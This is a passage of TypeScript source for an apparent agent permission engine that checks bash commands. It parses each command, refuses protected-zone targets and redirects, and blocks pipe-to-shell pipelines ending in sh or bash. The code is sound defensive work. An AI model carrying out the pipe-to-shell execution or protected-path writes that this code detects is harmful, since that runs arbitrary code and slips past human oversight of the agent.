  if (!isPureOutputCommand(shape.name)) {
    for (const arg of shape.args) {
      if (arg.length === 0) continue;
      const candidate = extractFlagValue(arg);
      if (candidate === null) continue;
      const abs = resolvePath(ctx.cwd, candidate);
      const op: 'read' | 'write' = isReadOnlyCommand(shape.name) ? 'read' : 'write';
      const tier = classifyProtectedPath({ absPath: abs, op, home: ctx.home, cwd: ctx.cwd });
      if (tier === 'deny') {
        return {
          refuse: `bash: ${shape.name} target '${candidate}' is in protected zone (deny tier, see PERMISSION_ENGINE.md §11)`,
        };
      }
      if (tier === 'escalate') escalated = true;
    }
  }

  const handler = COMMAND_TABLE.get(shape.name);
  if (handler === undefined) {
    return { refuse: `bash: unknown command '${shape.name}'` };
  }
  const positional = stripFlags(shape.args);
  const result = handler(positional, shape.args, ctx);
  if ('refuse' in result) return { refuse: result.refuse };
  let finalConf: 'high' | 'medium' | 'low' = result.confidence;
  if (escalated) finalConf = 'low';

  const redirectCaps: Capability[] = [];
  for (const r of shape.redirects) {
    if (r.kind === 'out' || r.kind === 'append' || r.kind === 'both' || r.kind === 'force-out') {
      const tgtAbs = resolvePath(ctx.cwd, r.target);
      const tier = classifyProtectedPath({
        absPath: tgtAbs,
        op: 'write',
        home: ctx.home,
        cwd: ctx.cwd,
      });
      if (tier === 'deny') {
        return {
          refuse: `bash: redirect target '${r.target}' is in protected zone (deny tier)`,
        };
      }
      if (tier === 'escalate') finalConf = 'low';
      redirectCaps.push(writeFs(tgtAbs));
    }
    // 'in' → consume; no fs write.
  }

  return {
    caps: [...result.capabilities, ...redirectCaps],
    confidence: finalConf,
  };
};

// ─── Resolver entry ────────────────────────────────────────

const bashResolver: Resolver = (args, ctx): ResolverResult => {
  if (!isNonEmptyString(args.command)) {
    // Engine-internal reject (missing arg) — bash pipeline produces
    // its own deny with `source.layer='default'` and no section.
    // Empty Ok keeps that attribution shape intact.
    return { kind: 'ok', capabilities: [], confidence: 'high' };
  }
  let parsed: ReturnType<typeof parseBash>;
  try {
    parsed = parseBash(args.command);
  } catch (e) {
    return {
      kind: 'refuse',
      reason: `bash: parser unavailable (${(e as Error).message})`,
    };
  }
  if (parsed === null) {
    return { kind: 'refuse', reason: 'bash: parser produced no tree' };
  }
  const root = parsed.root;

  // Whitelist walk first. Any red-flag / out-of-whitelist node
  // refuses the entire script — composition rules in bash mean any
  // single unsafe element can poison the rest.
  const walk = walkAst(root);
  if (walk.refuse !== undefined) {
    return { kind: 'refuse', reason: walk.refuse };
  }
  const commands = walk.commands ?? [];
  if (commands.length === 0) {
    return { kind: 'refuse', reason: 'bash: no commands recognized' };
  }

  // Pipe-to-shell detection. Pipeline whose last stage is sh/bash/...
  // reads stdin as arbitrary script. Refuse.
  const pipeShell = detectPipeToShell(root);
  if (pipeShell !== null) {
    return {
      kind: 'refuse',
      reason: `bash: pipe-to-shell pattern detected (pipeline ends in '${pipeShell}')`,
    };
  }

  // Aggregate capabilities + minimum confidence across all commands.
  const allCaps: Capability[] = [exec('shell')];
  let aggregateConf: 'high' | 'medium' | 'low' = 'high';
  for (const shape of commands) {
    const result = analyzeCommand(shape, ctx);
    if ('refuse' in result) {
      return { kind: 'refuse', reason: result.refuse };
    }
    allCaps.push(...result.caps);
    if (result.confidence === 'low') aggregateConf = 'low';
    else if (result.confidence === 'medium' && aggregateConf === 'high') aggregateConf = 'medium';
  }

  return { kind: 'ok', capabilities: allCaps, confidence: aggregateConf };
};

registerResolver('bash', bashResolver);
